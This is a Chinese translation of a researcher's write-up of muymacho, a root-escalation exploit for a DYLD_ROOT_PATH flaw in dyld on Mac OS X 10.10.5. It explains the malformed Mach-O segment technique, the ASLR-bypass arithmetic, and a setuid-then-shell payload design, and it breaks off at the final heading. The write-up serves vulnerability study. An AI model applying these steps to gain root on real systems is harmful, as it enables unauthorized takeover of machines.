# muymacho---dyld_root_path漏洞利用解析

from:[https://luismiras.github.io/muymacho-exploiting_DYLD_ROOT_PATH/](https://luismiras.github.io/muymacho-exploiting_DYLD_ROOT_PATH/)

[muymacho](https://github.com/luismiras/muymacho)是一个漏洞利用工具。存在于Mac OS X 10.10.5中[dyld](https://developer.apple.com/library/mac/documentation/Darwin/Reference/ManPages/man1/dyld.1.html)的bug可以用来提权至root。在最新的酋长石（EI Capitan 10.11）中已经被修补。

这是一个有趣的bug，利用过程也很好玩。本篇文章的目的就是介绍该利用的过程。你可以阅读dyld的源代码来跟随我们一起探索其中的奥秘。我希望你能享受muymacho给你带来的快乐。

...dyld_sim是一个Mach-O文件，但是利用漏洞的过程将dyld_sim变成了muymacho ：）

下面我们进入正题：

0x00 漏洞发现
=====

该bug最初是在[dyld-353.2.1](https://opensource.apple.com/source/dyld/dyld-353.2.1/)（10.10.0-10.10.4）的源代码审计中发现的，后来通过IDA pro对10.10.5更新的二进制文件分析发现bug依然存在。苹果公司最终在9/17/2015发布了10.10.5的源代码。本文也进行了更新来涵盖最新的dyld源代码。

对dyld的兴趣来自[@i0n1c](https://twitter.com/i0n1c)在7/20号发布的挑战。

![](http://drops.javaweb.org/uploads/images/7c405075fa3787eedb933990917fe0faafc3f258.jpg)

我找到了与环境变量DYLD_PRINT_TO_FILE相关的bug并且写了一个exploit。之后不久，i0n1c发布了他的[writeup](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)和exploit。

当我在寻找DYLD_PRINT_TO_FILE漏洞的时候，我发现了一些有问题的代码。后来我又重新进行审计，发现了一个DYLD_ROOT_PATH的漏洞。我确信我是不第一个也不是唯一一个发现该漏洞的人。

![](http://drops.javaweb.org/uploads/images/32917dc88f446ad9af2b03fbd86935dc7d6cdbdd.jpg)

![](http://drops.javaweb.org/uploads/images/960580f8c6f7f58012f408a5da93f402e9cba381.jpg)

注：我认为该漏洞可能已经被编号为CVE-2015-5876（提交者为grayhash的[beist](https://twitter.com/beist)）。更多细节可以在附录中的CVE号那一节中获得。

DYLD_ROOT_PATH漏洞是本文的主题，在接下来几节里面进行详细介绍。该漏洞已经在EI Capitan版本中进行修补。

dyld是OS X和iOS的动态连接器。它和系统加载器（loader）一起协同来为一个进程的的执行做前期的准备工作。基本的步骤为：

*   系统loader将二进制文件的page和dyld加载进内存
*   控制权交给dyld，所有它可以加载和连接其他的库和需要的的文件到进程的地址空间
*   进程加载完成，在内存的进程执行入口点开始执行

在一个拥有suid的二进制文件执行的时候，dyld会提权运行。二进制并没有实际开始执行，因此不能降低权限。

更多细节可以参考[link](https://mikeash.com/pyblog/friday-qa-2012-11-09-dyld-dynamic-linking-on-os-x.html)和[link](http://drops.com:8000/www.newosxbook.com/articles/DYLD.html)（dyld实际上比本文总结的要复杂的多）。

该漏洞与DYLD_ROOT_PATH环境变量的使用有关。下面是一段dyld主页的摘要：

> **DYLD_ROOT_PATH**This is a colon separated list of directories. The dynamic linker will prepend each of this directory paths to every image access until a file is found.

尽管上面的描述是真实的，但是还有一个增加的功能并没有写进文档。为了理解该功能，我们需要稍微讨论一下iOS模拟器。与Android使用仿真器不同（执行ARM指令），iOS使用一个模拟器来运行x86_64编译的程序。模拟器的一个步骤就是在dyld中使用特定的iOS模拟器版本来替换build的。这个特殊的版本被称作dyld_sim。

为了使用dyld_sim，需要在执行程序的语句前将环境变量DYLD_ROOT_PATH设置到一个目录中。具体如下：

```
$ DYLD_ROOT_PATH=/Users/user/tmp crontab

```

上面的例子希望dyld_sim被设置到如下的目录中

```
/Users/user/tmp/usr/lib/dyld_sim

```

漏洞的细节在下节中讲解。但是先提前透露点，关键就在于dyld_sim文件的验证不足。dyld_sim是一个Mach-O格式文件，但是开发利用将dyld_sim变成了muymacho ：）

0x01 漏洞
=====

本文大多数的分析都是针对dyld-353.2.3（10.10.5）的[dyld.cpp](https://opensource.apple.com/source/dyld/dyld-353.2.3/src/dyld.cpp)，除了在附录里面介绍10.10.4版本的那一节。这个bug看起来是在与OS X 10.9一起发布的[dyld-239.3](http://drops.com:8000/opensource.apple.com/source/dyld/dyld-239.3/)中引入的。

漏洞代码存在于`dyld.cpp:useSimulatorDyld()`函数。如果一个dyld_sim文件存在于DYLD_ROOT_PATH指向的目录中，dyld_sim将会被打开，打开后返回的文件描述符将会传给`useSimulatorDyld()`。

下面的代码取自`dyld.cpp:_main()`

```
strlcat(simDyldPath, "/usr/lib/dyld_sim", PATH_MAX);
   int fd = my_open(simDyldPath, O_RDONLY, 0);
   if ( fd != -1 ) {
      result = useSimulatorDyld(fd, mainExecutableMH, simDyldPath, argc, argv, envp, apple, startGlue);
      if ( !result && (*startGlue == 0) )
         halt("problem loading iOS simulator dyld");

```

下面给出了`useSimulatorDyld()`的全部代码。它处理和加载dyld_sim。需要指出的是`useSimulatorDyld()`函数中任何的失败都会导致进程的停止。

```
__attribute__((noinline))static uintptr_t useSimulatorDyld(int fd, const macho_header* mainExecutableMH, const char* dyldPath, 
                int argc, const char* argv[], const char* envp[], const char* apple[], uintptr_t* startGlue){
  *startGlue = 0;

  // verify simulator dyld file is owned by root
  struct stat sb;
  if ( fstat(fd, &sb) == -1 )
    return 0;    

  // read first page of dyld file
  uint8_t firstPage[4096];
  if ( pread(fd, firstPage, 4096, 0) != 4096 )
    return 0;

  // if fat file, pick matching slice
  uint64_t fileOffset = 0;
  uint64_t fileLength = sb.st_size;
  const fat_header* fileStartAsFat = (fat_header*)firstPage;
  if ( fileStartAsFat->magic == OSSwapBigToHostInt32(FAT_MAGIC) ) {
    if ( !fatFindBest(fileStartAsFat, &fileOffset, &fileLength) ) 
      return 0;
    // re-read buffer from start of mach-o slice in fat file
    if ( pread(fd, firstPage, 4096, fileOffset) != 4096 )
      return 0;
  }
  else if ( !isCompatibleMachO(firstPage, dyldPath) ) {
    return 0;
  }

  // calculate total size of dyld segments
  const macho_header* mh = (const macho_header*)firstPage;
  uintptr_t mappingSize = 0;
  uintptr_t preferredLoadAddress = 0;
  const uint32_t cmd_count = mh->ncmds;
  const struct load_command* const cmds = (struct load_command*)(((char*)mh)+sizeof(macho_header));
  const struct load_command* cmd = cmds;
  for (uint32_t i = 0; i < cmd_count; ++i) {
    switch (cmd->cmd) {
      case LC_SEGMENT_COMMAND:
        {
          struct macho_segment_command* seg = (struct macho_segment_command*)cmd;
          mappingSize += seg->vmsize;
          if ( seg->fileoff == 0 )
            preferredLoadAddress = seg->vmaddr;
        }
        break;
    }
    cmd = (const struct load_command*)(((char*)cmd)+cmd->cmdsize);
  }    

  // reserve space, then mmap each segment
  vm_address_t loadAddress = 0;
  uintptr_t entry = 0;
  if ( ::vm_allocate(mach_task_self(), &loadAddress, mappingSize, VM_FLAGS_ANYWHERE) != 0 )
    return 0;
  cmd = cmds;
  struct linkedit_data_command* codeSigCmd = NULL;
  for (uint32_t i = 0; i < cmd_count; ++i) {
    switch (cmd->cmd) {
      case LC_SEGMENT_COMMAND:
        {
          struct macho_segment_command* seg = (struct macho_segment_command*)cmd;
          uintptr_t requestedLoadAddress = seg->vmaddr - preferredLoadAddress + loadAddress;
          void* segAddress = ::mmap((void*)requestedLoadAddress, seg->filesize, seg->initprot, MAP_FIXED | MAP_PRIVATE, fd, fileOffset + seg->fileoff);
          //dyld::log("dyld_sim %s mapped at %p\n", seg->segname, segAddress);
          if ( segAddress == (void*)(-1) )
            return 0;
        }
        break;
      case LC_UNIXTHREAD:
        {
        #if __i386__
          const i386_thread_state_t* registers = (i386_thread_state_t*)(((char*)cmd) + 16);
          entry = (registers->__eip + loadAddress - preferredLoadAddress);
        #elif __x86_64__
          const x86_thread_state64_t* registers = (x86_thread_state64_t*)(((char*)cmd) + 16);
          entry = (registers->__rip + loadAddress - preferredLoadAddress);
        #endif
        }
        break;
      case LC_CODE_SIGNATURE:
        codeSigCmd = (struct linkedit_data_command*)cmd;
        break;
    }
    cmd = (const struct load_command*)(((char*)cmd)+cmd->cmdsize);
  }

  if ( codeSigCmd == NULL )
    return 0;    

  fsignatures_t siginfo;
  siginfo.fs_file_start=fileOffset;             // start of mach-o slice in fat file 
  siginfo.fs_blob_start=(void*)(long)(codeSigCmd->dataoff); // start of code-signature in mach-o file
  siginfo.fs_blob_size=codeSigCmd->datasize;          // size of code-signature
  int result = fcntl(fd, F_ADDFILESIGS_FOR_DYLD_SIM, &siginfo);
  if ( result == -1 ) {
    dyld::log("fcntl(F_ADDFILESIGS_FOR_DYLD_SIM) failed with errno=%d\n", errno);
    return 0;
  }    

  close(fd);    

  // notify debugger that dyld_sim is loaded
  dyld_image_info info;
  info.imageLoadAddress = (mach_header*)loadAddress;
  info.imageFilePath    = strdup(dyldPath);
  info.imageFileModDate = sb.st_mtime;
  addImagesToAllImages(1, &info);
  dyld::gProcessInfo->notification(dyld_image_adding, 1, &info);

  // jump into new simulator dyld
  typedef uintptr_t (*sim_entry_proc_t)(int argc, const char* argv[], const char* envp[], const char* apple[],
                const macho_header* mainExecutableMH, const macho_header* dyldMH, uintptr_t dyldSlide,
                const dyld::SyscallHelpers* vtable, uintptr_t* startGlue);
  sim_entry_proc_t newDyld = (sim_entry_proc_t)entry;
  return (*newDyld)(argc, argv, envp, apple, mainExecutableMH, (macho_header*)loadAddress, 
           loadAddress - preferredLoadAddress, 
           &sSysCalls, startGlue);}

```

`useSimulatorDyld()`的目的是加载dyld_sim，执行一些检查，然后将控制权交给dyld_sim。dyld_sim开始执行，原来的dyld就被取代。

我们可以从上面的代码知道，`useSimulatorDyld()`做了以下几件事：

1.  读取Mach-O头
2.  循环处理LC_SEGMENT_64命令并且计算出全部数据的大小
3.  vm_allocate()申请内存
4.  mmap()将segment段都读取进内存
5.  验证代码签名
6.  跳转到dyld_sim的入口

muymacho利用的就是从10.9就存在的DYLD_ROOT_PATH漏洞。从10.10.4起，又增加一个可以进行攻击的向量，但是在10.10.5中被修补。 聪明的读者可以发现漏洞存在于dyld_sim的Mach-O头的处理过程中。一个畸形的Mach-O文件可以导致内存段被替换，从而导致任意代码执行，这一切都发生在签名验证之前。

为了说明mach-O文件加载进内存是如何进行的，我们需要复习一下Mach-O的知识。苹果提供了一份完整的Mach-O说明[文档](https://developer.apple.com/library/mac/documentation/DeveloperTools/Conceptual/MachORuntime/index.html)。我们将相关的两个结构定义放在了下面，其中最为重要的是segment_command_64。

```
/* * The 64-bit mach header appears at the very beginning of object files for * 64-bit architectures. */
struct mach_header_64 {
   uint32_t      magic;      /* mach magic number identifier */
   cpu_type_t    cputype;    /* cpu specifier */
   cpu_subtype_t cpusubtype; /* machine specifier */
   uint32_t      filetype;   /* type of file */
   uint32_t      ncmds;      /* number of load commands */
   uint32_t      sizeofcmds; /* the size of all the load commands */
   uint32_t      flags;      /* flags */
   uint32_t      reserved;   /* reserved */
};
/* * The 64-bit segment load command indicates that a part of this file is to be * mapped into a 64-bit task's address space.  If the 64-bit segment has * sections then section_64 structures directly follow the 64-bit segment * command and their size is reflected in cmdsize. */
struct segment_command_64 { /* for 64-bit architectures */
   uint32_t   cmd;          /* LC_SEGMENT_64 */
   uint32_t   cmdsize;      /* includes sizeof section_64 structs */
   char       segname[16];  /* segment name */
   uint64_t   vmaddr;       /* memory address of this segment */
   uint64_t   vmsize;       /* memory size of this segment */
   uint64_t   fileoff;      /* file offset of this segment */
   uint64_t   filesize;     /* amount to map from the file */
   vm_prot_t  maxprot;      /* maximum VM protection */
   vm_prot_t  initprot;     /* initial VM protection */
   uint32_t   nsects;       /* number of sections in segment */
   uint32_t   flags;        /* flags */
};

```

首先，`useSimulatorDyld()`需要提取Mach-O头。可以在源代码中看到，在处理胖格式（[Universal binary](https://en.wikipedia.org/wiki/Universal_binary)）的初始化代码来确定确定实际Mach-O头的位置。dyld然后读取一页（0x1000bytes）的数据，其中包含该Mach-O头。

载入了Mach-O头之后，`useSimulatorDyld()`处理加载命令。通过两个循环来处理如LC_SEGMENT_64, LC_UNIXTHREAD和 LC_CODE_SIGNATURE之类的加载命令。 第一个循环处理显示如下。处理LC_SEGMENT_64加载命令。计算出vmsize的总大小，确定preferredLoadAddress。如果没有segment段的fileoff项为0，那么preferredLoadAddress默认设置为0。

```
for (uint32_t i = 0; i < cmd_count; ++i) {
      switch (cmd->cmd) {
         case LC_SEGMENT_COMMAND: // <-- Note: defined in a macro as LC_SEGMENT_64 
            {
               struct macho_segment_command* seg = (struct macho_segment_command*)cmd;
               mappingSize += seg->vmsize;
               if ( seg->fileoff == 0 )
                  preferredLoadAddress = seg->vmaddr;
            }
            break;
      }
      cmd = (const struct load_command*)(((char*)cmd)+cmd->cmdsize);
   }

```

在mappingSize计算出来后调用`vm_allocate()`。分配内存的地址被保存在loadAddress变量中。如果分配失败，`useSimulatorDyld()`函数退出。

```
if ( ::vm_allocate(mach_task_self(), &loadAddress, mappingSize, VM_FLAGS_ANYWHERE) != 0 )
      return 0;

```

分配内存之后，就到了第二个循环，相关代码如下。这个循环同样解析LC_UNIXTHREAD，LC_CODESIGNATURE加载命令，但是与漏洞无关。 导致漏洞产生的是这个加载命令：LC_SEGMENT_64。

```
case LC_SEGMENT_COMMAND: // <- this is defined in a macro as LC_SEGMENT_64
   {
      struct macho_segment_command* seg = (struct macho_segment_command*)cmd;
      uintptr_t requestedLoadAddress = seg->vmaddr - preferredLoadAddress + loadAddress;
      void* segAddress = ::mmap((void*)requestedLoadAddress, seg->filesize, seg->initprot, MAP_FIXED | MAP_PRIVATE, fd, fileOffset + seg->fileoff);
      //dyld::log("dyld_sim %s mapped at %p\n", seg->segname, segAddress);
      if ( segAddress == (void*)(-1) )
         return 0;
   }

```

看代码可以发现，这个case段的代码功能是加载segment段到最新分配的内存中去。但是，这个LC_SEGMENT_64加载命令几乎没有进行任何验证。具体说就是这段代码计算出requestedLoadAddress的参数，是来自Macho-O完全可控的区域的。

```
uintptr_t requestedLoadAddress = seg->vmaddr - preferredLoadAddress + loadAddress;

```

prederredLoadAddress默认是0，剩下只有loadAddress和`seg->vmaddr`起作用了。下面是一个简化的等式。这个等式将会以不同的形式贯穿于本文。

```
requestedLoadAddress = seg->vmaddr + loadAddress

```

`seg->vmaddr`是直接从segment段命令获取，之后加上loadAddress（由vm_allocate设置）。一部分已经受到控制的requestedLoadAddress变量最后作为参数传给mmap。

mmap使用了一些有趣的flag。特别是MAP_FIXED。下面是一段[mmap手册](https://developer.apple.com/library/mac/documentation/Darwin/Reference/ManPages/man2/mmap.2.html)的摘录

> **MAP_FIXED**Do not permit the system to select a different address than the one specified. If the specified address cannot be used, mmap() will fail. If MAP_FIXED is specified, addr must be a multiple of the pagesize. If a MAP_FIXED request is successful, the mapping established by mmap() **replaces any previous mappings** for the process’ pages in the range from addr to addr + len. Use of this option is discouraged.

（不让系统在给出的地址外选择其他的地址。如果给出的地址不能使用，mmap()函数返回失败。如果声明了MAP_FIXED，地址必须是页面大小的倍数。如果一个MAP_FIXED请求成功，mmap()进行加载，会替换该进程之前在addr到addr+len之间的任何加载映射。使用这个选项是不被推荐的。）

关键词是 “替换任何之前的内存映射”。无论是堆，还是栈，甚至是执行代码都会被替换。一个攻击者可以创建一个Mach-O文件。对其LC_SEGMENT_64 加载命令进行构造。这不仅仅是控制requestedLoadAddress，而且可以完全控制页面权限，filesize和fileoff。

在调试器中手工测试证明了mmap()调用后可以成功替换可执行页。

0x02 利用分析
=====

如下是一个欺骗要素表单，提供一份对不同的定义和词语的快速参考。

> **CHEAT SHEET**
> 
> **loadAddress**address returned by vm_allocate()
> 
> **vmaddr**segment’s vmaddr value (seg->vmaddr)
> 
> **mmap_equation**requestedLoadAddress = vmaddr + loadAddress

拥有了替换内存可执行页的能力，利用漏洞就变得相对简单了。ROP也没必要了，因为我们可以控制新加载的可执行内存页的内容。我们的需要覆盖的目标页将是dyld里面拥有mmap系统调用的那一页。如果现在的OS X操作系统没有ASLR，这些就不重要了。我们首先进行没有ASLR的利用分析。然后再考虑如何绕过它。

因为dyld是动态连接器，所有它需要自我包含。dyld拥有它需要使用的所有系统调用。`useSimulatorDyld()`函数调用`::mmap()`函数（包装了`__mmap()`）。

```
00007FFF5FC2693E           mov     r12d, ecx
00007FFF5FC26941           mov     r8d, r15d
00007FFF5FC26944           call    ___mmap
00007FFF5FC26949           mov     rbx, rax
00007FFF5FC2694C           lea     rax, ___syscall_logger

```

`__mmap()`函数包含了mmap系统调用。

```
00007FFF5FC26DBC ___mmap   proc near               ; CODE XREF: _mmap+31p
00007FFF5FC26DBC           mov     eax, 20000C5h
00007FFF5FC26DC1           mov     r10, rcx
00007FFF5FC26DC4           syscall
00007FFF5FC26DC6           jnb     short locret_7FFF5FC26DD0

```

当mmap系统调用返回的时候，指令指针将会指向地址0x7fff5fc26dc6。传给mmap一个0x7fff5fc26000的requestedLoadAddress参数。mmap将会替换我们的包含mmap系统调用的目标内存页。当新的segment段被加载，进程将开始执行我们的代码。

```
uintptr_t requestedLoadAddress = seg->vmaddr - preferredLoadAddress + loadAddress;

```

简化的mmap等式为：（preferredLoadAddress默认值为0）

```
requestedLoadAddress = seg->vmaddr + loadAddress

```

如果我们回忆一下，会发现loadAddress是由vm_allocate函数设置的。如下所示，vm_allocate返回的地址就在基础程序页之后。举例，crontab生成一个如下的内存分布：

```
==== regions for process 44045  (non-writable and writable regions are interleaved)
REGION TYPE                      START - END             [ VSIZE] PRT/MAX SHRMOD  REGION DETAIL
mapped file            0000000100000000-0000000100005000 [   20K] r-x/rwx SM=COW  /Users/user/tmp/crontab
mapped file            0000000100005000-0000000100006000 [    4K] rw-/rwx SM=COW  /Users/user/tmp/crontab
mapped file            0000000100006000-0000000100009000 [   12K] r--/rwx SM=COW  /Users/user/tmp/crontab
VM_ALLOCATE (reserved) 0000000100009000-0000000100029000 [  128K] rw-/rwx SM=NUL  reserved VM address space (unallocated)
STACK GUARD            00007fff5bc00000-00007fff5f400000 [ 56.0M] ---/rwx SM=NUL  stack guard for thread 0
Stack                  00007fff5f400000-00007fff5fbff000 [ 8188K] rw-/rwx SM=PRV  thread 0
Stack                  00007fff5fbff000-00007fff5fc00000 [    4K] rw-/rwx SM=COW
__TEXT                 00007fff5fc00000-00007fff5fc37000 [  220K] r-x/rwx SM=COW  /usr/lib/dyld
__DATA                 00007fff5fc37000-00007fff5fc3a000 [   12K] rw-/rwx SM=COW  /usr/lib/dyld
__DATA                 00007fff5fc3a000-00007fff5fc70000 [  216K] rw-/rwx SM=PRV  /usr/lib/dyld
__LINKEDIT             00007fff5fc70000-00007fff5fc84000 [   80K] r--/rwx SM=COW  /usr/lib/dyld
shared memory          00007fffffe00000-00007fffffe01000 [    4K] r--/r-- SM=SHM
shared memory          00007fffffeed000-00007fffffeee000 [    4K] r-x/r-x SM=SHM

```

如上内存分布，loadAddress是0x100009000（VM_ALLOCATE）。如果将`seg->vmaddr`设置为0x7ffe5fc1d000，那么将会替换dyld可执行页在地址0x7fff5fc26000。

```
seg->vmaddr = requestedLoadAddress - loadAddress
seg->vmaddr = 0x7fff5fc26000 - 0x100009000
seg->vmaddr = 0x7ffe5fc1d000

```

我们可以构建一个Mach-O文件，使得它的seg->vmaddr值为0x7ffe5fc1d000。这样目的就可以实现。

![](http://drops.javaweb.org/uploads/images/fb7413a42967bfea7304fbd2e3957c49b39d03ce.jpg)

以上的内存分布和计算都是在没有ASLR的情况下进行的，目的是为了讨论更为简单。下一节将讨论ASLR的绕过。

0X03 ASLR绕过
=====

下面是一个升级版的欺骗要素表单。

> **CHEAT SHEET**
> 
> **loadAddress**       address returned by vm_allocate()
> 
> **vmaddr**               segment’s vmaddr value (seg->vmaddr)
> 
> **dyld_target dyld**page we are targetting (contains the mmap syscall)
> 
> **mmap_equation**   requestedLoadAddress = vmaddr + loadAddress
> 
> **ASLR slide**    random offset applied to memory regions 0x0000000 to 0xffff000 bytes (0 to 0xffff pages)

之前的一节忽略了ASLR，但这是必须面对的。ASLR添加偏移到各种内存区域，包括可执行页，栈和dyld的可执行页。为了抵御攻击，导致内存地址不固定了。

下面是一个开启了ASLR的内存布局实例。注意dyld没有加载到它的首选偏移上，与之前的内存分布不一样，实际上它偏移为0x9f40000 bytes。

```
==== regions for process 44357  (non-writable and writable regions are interleaved)
REGION TYPE                      START - END             [ VSIZE] PRT/MAX SHRMOD  REGION DETAIL
mapped file            0000000102da7000-0000000102dac000 [   20K] r-x/rwx SM=COW  /usr/bin/crontab
mapped file            0000000102dac000-0000000102dad000 [    4K] rw-/rwx SM=COW  /usr/bin/crontab
mapped file            0000000102dad000-0000000102db0000 [   12K] r--/rwx SM=COW  /usr/bin/crontab
VM_ALLOCATE (reserved) 0000000102db0000-0000000102dd0000 [  128K] rw-/rwx SM=NUL  reserved VM address space (unallocated)
STACK GUARD            00007fff58e59000-00007fff5c659000 [ 56.0M] ---/rwx SM=NUL  stack guard for thread 0
Stack                  00007fff5c659000-00007fff5ce58000 [ 8188K] rw-/rwx SM=ZER  thread 0
Stack                  00007fff5ce58000-00007fff5ce59000 [    4K] rw-/rwx SM=COW
__TEXT                 00007fff69b09000-00007fff69b40000 [  220K] r-x/rwx SM=COW  /usr/lib/dyld
__DATA                 00007fff69b40000-00007fff69b43000 [   12K] rw-/rwx SM=COW  /usr/lib/dyld
__DATA                 00007fff69b43000-00007fff69b79000 [  216K] rw-/rwx SM=PRV  /usr/lib/dyld
__LINKEDIT             00007fff69b79000-00007fff69b8d000 [   80K] r--/rwx SM=COW  /usr/lib/dyld
shared memory          00007fffffe00000-00007fffffe01000 [    4K] r--/r-- SM=SHM
shared memory          00007fffffeed000-00007fffffeee000 [    4K] r-x/r-x SM=SHM

```

其他内存区域包含偏移。crontab基础二进制文件拥有一个0xda7000byte偏移。同样的偏移应用在loadAddress（VM_ALLOCATE区）。

0x04 内存区块和范围
=====

利用分析一节解决了vmaddr的取值问题，使得当加上loadAddress之后就可以替换dyld的目标可执行页。我们的目的没有变， 希望能用我们的内容覆盖dyld的目标页。然而我们内存地址不再是固定的地址。我们执行环境的地址是在有限的地址范围内变化的。

在制定一个攻击计划之前，我们需要确定内存的变化范围是多少。使用ASLR后，可能的地址范围变为：

*   **loadAddress**:`0x100009000 to 0x110008000 (max ASLR slide = 0x0ffff000)`
*   **dyld_target**:`0x7fff5fc26000 - 0x7fff6fc25000 (max ASLR slide = 0x0ffff000)`

下一步，我们计算vmaddr的可能取值范围。我们希望mmap能覆盖dyld的目标页，所以用dyld_target取值范围替换mmap等式中的requestedLoadAddress：

```
vmaddr = dyld_target - loadAddress

```

为了确定vmaddr的范围，我们需要最小值和最大值。接下来的图显示了如何来计算：

![](http://drops.javaweb.org/uploads/images/37b05d8007f9a3d846ee154f493c2509b6831ce9.jpg)

图左侧显示了最小的vmaddr，它使用了dyld_target的最小值和loadAddress的最大值：

```
vmaddr_min = (dyld_target + ASLR_slide_min) - (loadAddress + ASLR_slide_max)vmaddr_min = (0x7fff5fc26000 + 0x00000000) - (0x100009000 + 0x0ffff000)vmaddr_min = 0x7fff5fc26000 - 0x110008000vmaddr_min = 0x7ffe4fc1e000

```

图右侧显示了最大的vmaddr，它使用了dyld_target的最大值和loadAddress的最小值：

```
vmaddr_max = (dyld_target + ASLR_slide_max) - (loadAddress + ASLR_slide_min)vmaddr_max = (0x7fff5fc26000 + 0x0ffff000) - (0x100009000 + 0x00000000)vmaddr_max = 0x7fff6fc25000 - 0x100009000vmaddr_max = 0x7ffe6fc1c000

```

vmaddr的范围为0x7ffe4fc1e000至0x7ffe6fc1c000。整个大小为0x1fffe000 bytes（为ASLR最大偏移的2倍）。

为了增强漏洞利用的稳定性，全部的内存范围都要需要被加载。从单一的segment段中加载整个范围是不可能的（没人想要一个500+MB的exploit！），所以我们使用多个segment段。

0x05 潜在问题
=====

在这里，我们需要解释一些更多的问题：

*   需要多少的segment段？
*   mmap会失败返回吗？
*   会发生不可预料的内存问题吗？

需要多少的segments段？
---------------

Mach-O头只能读取仅仅一页（0x1000 bytes ） ，mach_header_64结构有0x20bytes大，segment_command_64结构有72bytes，所以最多只能有56个segment（(4096-32)/72=56）。为了简化计算，muymacho使用了32个segment段。所有的segment的fileoff成员变量都指向同一块数据（0x1000000bytes）。

![](http://drops.javaweb.org/uploads/images/186fe90547b86840e56d420a460c907595238d4c.jpg)

这32个segment将会覆盖全部的vmaddr范围（0x1fffe000），还多一页剩余。

![](http://drops.javaweb.org/uploads/images/f296bf703c1dec24d0a2c4f9aeee0ae8ca02fb9c.jpg)

所以需要32个segment。

mmap会失败返回吗？
-----------

`useSimulatorDyld()`中调用mmap的部分代码如下所示。注意如果mmap失败，`useSimulatorDyld()`函数就退出。

```
void* segAddress = ::mmap((void*)requestedLoadAddress, seg->filesize, seg->initprot, MAP_FIXED | MAP_PRIVATE, fd, fileOffset + seg->fileoff);
   //dyld::log("dyld_sim %s mapped at %p\n", seg->segname, segAddress);
   if ( segAddress == (void*)(-1) )
      return 0;

```

mmap申请的内存如果超出了用户空间（大于0x7fffffffffff）就会失败。我们需要保证下面的限制：

```
requestedLoadAddress + seg->filesize < 0x7fffffffffff

```

由于ASLR，我们不知道真实的loadAddress和dyld_target地址。我们计算出了vmaddr的最小值（0x7ffe4fc1e000）和最大值（0x7ffe6fc1c000），以此来对抗ASLR。

我们来计算最大的requestedLoadAddress，使用mmap等式，代入最大的vmaddr值和最大的loadAddress。

```
requestedLoadAddress = vmaddr + loadAddressrequestedLoadAddress = 0x7ffe6fc1c000 + (loadAddress + 0x0ffff000)requestedLoadAddress = 0x7ffe6fc1c000 + (0x100009000 + 0x0ffff000)requestedLoadAddress = 0x7ffe6fc1c000 + 0x110008000 requestedLoadAddress = 0x7fff7fc24000

```

requestedLoadAddress的值为0x7fff7fc24000能很好的满足用户空间限定。`seg->filesize`需要大于0x803dbfff才能导致mmap调用失败。这显然不会发生。

会发生不可预料的内存问题吗？
--------------

加载如此大的segment（0x1000000）可能会引起某些疑虑，问题可以这样理解：

1.  当我们替换dyld_target的时候会破坏栈吗？
2.  如果我们覆盖了一部分dyld的页会发生什么？

在下一节实践中将会说明muymacho使用了由高至低策略。这种方法保证高地址先被替换。栈的地址低于dyld_target页面地址，在一个安全的距离上，所以栈是安全的：）

是否有这种可能，只有一部分的dyld页从一个segment加载，其余的页会在之后由下一个段加载。这有关系吗？不。

mmap系统调用，包装之后的函数，和`useSimulatorDyld()`里面的主要解析循环都被包含在dyld_target页中。`useSimulatorDyld()`的其他部分在下一个低地址页里面。

所以一切都没问题。

0x06 实践
=====

muymacho使用了32个segments来覆盖一个0x20000000bytes大小的地址。这保证了所有的ASLR内存范围都被覆盖了。Segments将会不停加载直至dyld_target被覆盖。在那里我们的代码将会取得控制权。

采用由高至低的策略是为了防止不必要的内存破坏，尤其是栈。第一个segment使用最大的vmaddr值。接下来的segments使用小一点的值。保证整个范围被覆盖。接下来的图提供了一个例子。记住这不是成比例的。dyld_target只是一个页而segment是4096个页。

![](http://drops.javaweb.org/uploads/images/40a8535de5ed7f837c9f4c73a557bfe28bc9cb35.jpg)

最终dyld_target将会被覆盖，代码将会得到执行。一旦dyld_target页被覆盖，控制权就会随着mmap调用的返回而立即获得。

0x07 最大vmaddr
=====

muymacho中使用的最大的vmaddr不同于我们之前计算的。下面的函数计算了这个最大vmaddr。

```
def maximum_vmaddr(segment_size):
    '''    returns the maximum vmaddr        the function assumes the base binary is 9 pages long    as is the case for crontab giving a     loadAddress_min of 0x100009000        if attacking other suid programs, this value should    be adjusted. in reality a few pages here or there    won't have a noticeable effect.    '''
    dyld_target = 0x7fff5fc26000
    loadAddress_min = 0x100009000 
    aslr_slide_max = 0x0ffff000    

    dyld_target_max = dyld_target + aslr_slide_max
    maximum_offset = dyld_target_max - loadAddress_min    

    # Only one page from the payload needs to hit the maximum offset.
    vmaddr = maximum_offset - segment_size + 0x1000      

    return vmaddr

```

唯一的不同之处在于下面的代码：

```
# Only one page from the payload needs to hit the maximum offset.
    vmaddr = maximum_offset - segment_size + 0x1000

```

原始的vmaddr最大值计算假设我们是加载到单个页中。我们实际上是每次加载4096个页。

调整计算方法来适应只加载一页在最大vmaddr。不然我们就会浪费那些永远不会覆盖dyld_target的页。

下面的图可能能说明这个概念：

![](http://drops.javaweb.org/uploads/images/232cd2f839824993c2e4f326daa1b8e4adde47e2.jpg)

左侧的图是显示的原始的最大vmaddr（0x7ffe6fc1c000）覆盖可能的最高的dyld_target。其他的所有页都是多余的，因为我们已经在可能的最大vmaddr值和dyld_target最高地址。这个segment中只有一页可能覆盖到dyld_target。

右侧的图是调整后的vmaddr（0x7ffe6ec1d000）。这个segment段将覆盖到可能的最高dyld_target。所有的4096segment页可以覆盖所有的可能dyld_target页。

0x08 载荷Payload
=====

在绕过ASLR那一节中，我们实现了一定了覆盖dyld_target。payload有0x1000000大，即4096个页。其中的一个页将覆盖到dyld_target页。

dyld的mmap系统调用显示如下：

```
00007FFF5FC26DBC ___mmap   proc near               ; CODE XREF: _mmap+31p
00007FFF5FC26DBC           mov     eax, 20000C5h
00007FFF5FC26DC1           mov     r10, rcx
00007FFF5FC26DC4           syscall
00007FFF5FC26DC6           jnb     short locret_7FFF5FC26DD0

```

当mmap系统调用返回时，将会从页内的0xdc6处开始执行。因为rax为返回值，它会存储最新加载内存的基地址，换句话说，rax指向我们payload的开始处。

所有4096个payload页的0xdc6处，都是一个jmp rax指令。payload开始处的第一页在0x00偏移处包含一段shellcode。

下图显示了基地址页（payload的地址最低的第一页）和标准页（4096也都有的内容）。

![](http://drops.javaweb.org/uploads/images/4565fa0cdc5bfdbfe926f14ac8f022e0c5dc3b00.jpg)

不必考虑哪一页会覆盖掉dyld_target，jmp rax指令都会将执行跳转到shellcode。

shellcode将会执行一条`setuid(0)`系统调用，然后执行`execve(/bin/sh'')`系统调用。启动一个sh。

0x09 完成利用
=====

